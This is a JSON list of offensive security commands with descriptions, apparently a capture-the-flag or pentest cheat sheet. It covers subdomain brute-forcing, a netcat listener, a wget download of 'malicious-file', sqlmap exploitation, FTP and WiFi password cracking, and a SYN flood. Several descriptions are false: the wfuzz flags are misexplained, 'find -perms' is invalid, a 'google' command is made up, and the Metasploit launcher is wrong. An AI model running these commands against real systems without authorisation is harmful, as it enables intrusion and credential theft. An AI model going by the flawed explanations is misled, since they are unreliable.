{
  "commands": [
    {
      "command": "dnsrecon -t brt -D /usr/share/wordlists/subdomains.txt -v -d example.com",
      "description": "Perform DNS reconnaissance using dnsrecon. The '-t brt' flag specifies the target type as 'brt', indicating a standard brute-force subdomain scan. '-D /usr/share/wordlists/subdomains.txt' specifies the wordlist containing potential subdomains to test. '-v' enables verbose mode, providing detailed output. '-d example.com' specifies the target domain as 'example.com'."
    },
    {
      "command": "amass enum -d example.com",
      "description": "Enumerate subdomains using amass. This command performs subdomain enumeration for the domain 'example.com' using the 'enum' mode of Amass. '-d example.com' specifies the target domain as 'example.com'."
    },
    {
      "command": "sublist3r -d example.com",
      "description": "Enumerate subdomains using sublist3r. This command searches for subdomains associated with the domain 'example.com' using sublist3r."
    },
    {
      "command": "wfuzz -c -f sub-fighter -w /usr/share/wordlists/subdomains.txt -u 'http://example.com' -H 'Host: FUZZ.example.com' --hl 125 --hc 200 --hw 40",
      "description": "Brute force subdomains using wfuzz. Wfuzz is being used to brute force subdomains of 'example.com'. '-c' specifies color output. '-f sub-fighter' specifies the output format. '-w /usr/share/wordlists/subdomains.txt' specifies the wordlist containing potential subdomains. '-u' specifies the URL to fuzz, in this case, 'http://example.com'. '-H' sets the Host header with the FUZZ placeholder. '--hl 125' sets the maximum length of the output to 125 characters. '--hc 200' sets the HTTP status codes to highlight. '--hw 40' sets the highlight for words in the response to 40 characters."
    },
    {
      "command": "ffuf -w /usr/share/wordlists/subdomains.txt -H 'Host: FUZZ.example.com' -u 10.10.10.10",
      "description": "Brute force subdomains using ffuf. FFuF is being used to brute force subdomains for the IP address '10.10.10.10'. '-w /usr/share/wordlists/subdomains.txt' specifies the wordlist containing potential subdomains. '-H' sets the Host header with the FUZZ placeholder."
    },
    {
      "command": "google microsoft.com -www -docs -infrastructuremap",
      "description": "Perform Google search for Microsoft.com. This command performs a Google search for 'microsoft.com' including web pages, documents, and infrastructure maps."
    },
    {
      "command": "whoami",
      "description": "Display the current user name. This command retrieves and displays the name of the current user."
    },
    {
      "command": "find / -type f -perms -u=s 2>/dev/null",
      "description": "Find files across the system with SUID bit set. This command searches the entire file system for files with the SUID bit set, indicating that the file can be executed with the privileges of its owner."
    },
    {
      "command": "netstat -tuln",
      "description": "List all active network connections and their corresponding ports. This command displays a list of all active network connections along with the ports they are using, both TCP and UDP."
    },
    {
      "command": "nmap -sP 192.168.1.0/24",
      "description": "Scan the local network for active devices. This command uses Nmap to perform a ping scan (-sP) on the IP range '192.168.1.0/24', identifying active devices on the local network."
    },
    {
      "command": "ps aux",
      "description": "Display information about all running processes. This command provides a detailed list of all running processes on the system, including their process IDs (PID), CPU and memory usage, and more."
    },
    {
      "command": "nc -lvp 4444",
      "description": "Listen on port 4444 for incoming connections. This command starts a netcat listener on port 4444, waiting for incoming connections. '-l' indicates listening mode, '-v' enables verbose mode, and '-p 4444' specifies the port number."
    },
    {
      "command": "wget http://example.com/malicious-file",
      "description": "Download a file from the specified URL. This command downloads a file named 'malicious-file' from the URL 'http://example.com'."
    },
    {
      "command": "ifconfig",
      "description": "Display information about all network interfaces. This command provides details about all network interfaces configured on the system, including IP addresses, MAC addresses, and more."
    },
    {
      "command": "sqlmap -u http://example.com --batch --banner",
      "description": "Automatically detect and exploit SQL injection vulnerabilities in the specified URL. This command uses sqlmap to automatically detect and exploit SQL injection vulnerabilities in the web application hosted at 'http://example.com'. '--batch' enables batch mode, and '--banner' displays the banner."
    },
    {
      "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
      "description": "Use John the Ripper to crack the passwords in hash.txt using the rockyou wordlist. This command utilizes John the Ripper to crack passwords stored in the file 'hash.txt' using the 'rockyou.txt' wordlist."
    },
    {
      "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.1",
      "description": "Use Hydra to perform password cracking for FTP service. This command uses Hydra to perform password cracking for the FTP service running on the host '192.168.0.1', with the username 'user' and the 'rockyou.txt' wordlist."
    },
    {
      "command": "nikto -h http://example.com",
      "description": "Use Nikto to scan a web server for known vulnerabilities. This command utilizes Nikto to perform a comprehensive scan of the web server hosted at 'http://example.com', identifying potential vulnerabilities and misconfigurations."
    },
    {
      "command": "aircrack-ng -a2 -b [BSSID] -w /path/to/wordlist [capfile.cap]",
      "description": "Crack WPA/WPA2 WiFi passwords using Aircrack-ng. This command uses Aircrack-ng to crack WPA/WPA2 WiFi passwords captured in the file 'capfile.cap', targeting the network with the BSSID '[BSSID]' using the specified wordlist."
    },
    {
      "command": "tcpdump -i eth0",
      "description": "Capture and display all packet headers on interface eth0. This command utilizes tcpdump to capture and display all packet headers on the network interface eth0."
    },
    {
      "command": "wireshark",
      "description": "Launch Wireshark GUI to analyze network traffic. This command launches the Wireshark graphical user interface (GUI) tool, allowing for the analysis of network traffic in real-time."
    },
    {
      "command": "hping3 -S 192.168.1.1 -p 80",
      "description": "Send SYN packets to host 192.168.1.1 on port 80 using hping3. This command utilizes hping3 to send SYN packets to the host '192.168.1.1' on port 80, simulating a TCP SYN flood attack."
    },
    {
      "command": "metasploit-framework",
      "description": "Launch the Metasploit framework console. This command starts the Metasploit framework console, providing a powerful platform for penetration testing and exploitation."
    },
    {
      "command": "burpsuite",
      "description": "Launch Burp Suite for web application security testing. This command launches Burp Suite, a comprehensive platform for web application security testing, including vulnerability scanning, penetration testing, and more."
    },
    {
      "command": "dirb http://example.com",
      "description": "Use dirb to perform brute force directory discovery. This command utilizes dirb to perform brute force directory discovery on the web server hosted at 'http://example.com', identifying hidden directories and files."
    },
    {
      "command": "gobuster dir -u http://example.com -w /path/to/wordlist",
      "description": "Use gobuster for directory brute-forcing on web servers. This command uses gobuster to perform directory brute-forcing on the web server hosted at 'http://example.com', using the specified wordlist to discover hidden directories and files."
    },
    {
      "command": "git grep 'flag' $(git rev-list --all)",
      "description": "Check github repository for flag"
    }
  ]
}
